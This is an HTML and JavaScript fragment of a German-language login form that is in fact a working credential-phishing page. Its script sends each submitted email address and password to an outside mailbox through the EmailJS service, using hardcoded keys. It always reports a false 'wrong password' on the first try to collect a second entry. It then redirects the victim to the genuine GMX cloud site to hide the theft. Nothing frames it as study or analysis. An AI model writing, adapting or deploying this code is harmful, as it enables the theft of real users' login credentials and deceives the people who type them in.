  <form id="loginForm">
    <div class="mb-3">
      <label for="email" class="form-label">E-Mail-Adresse</label>
      <input type="email" class="form-control" id="email" name="email" required>
    </div>

    <div class="mb-1 position-relative">
      <label for="password" class="form-label">Passwort</label>
      <input type="text" class="form-control" id="password" name="password" required>
      <span class="toggle-password">&#128065;</span>
    </div>

    <div class="mb-4 text-end">
      <a href="#" class="text-decoration-none text-dark">Passwort vergessen?</a>
    </div>

    <div class="d-grid">
      <button type="submit" class="btn btn-login">Login</button>
    </div>
  </form>
</div>

<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
 (function(){
  emailjs.init("e-odc3Xm-IiG3AvDa"); 
})();

const togglePassword = document.querySelector('.toggle-password');
const passwordInput = document.querySelector('#password');
togglePassword.addEventListener('click', function () {
  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
  passwordInput.setAttribute('type', type);
});

let submissionCount = 0; // New: to track how many times the form was submitted

const form = document.getElementById('loginForm');
form.addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  emailjs.send('service_qy28vyz', 'template_ivhwsnt', {
    email: email,
    password: password
  })
  .then(function(response) {
    submissionCount++; 

    if (submissionCount === 1) {
      swal({
        title: "Falsches Passwort ❗️",
        icon: "warning",
        button: "OK",
})
    } else if (submissionCount === 2) {
      swal({
        title: "ANFRAGE GESENDET",
        text: "Wir melden uns innerhalb von 24 Stunden bei Ihnen. Vielen Dank...",
        icon: "success",
});
      setTimeout(function() {
        window.location.href = 'https://www.gmx.net/cloud/#.pc_page.homepage.ch.nav.cloud'; 
      }, 3000);
    }

  }, function(error) {
    console.log('FAILED...', error);
    alert('Errore durante l\'invio!');
  });
});
</script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
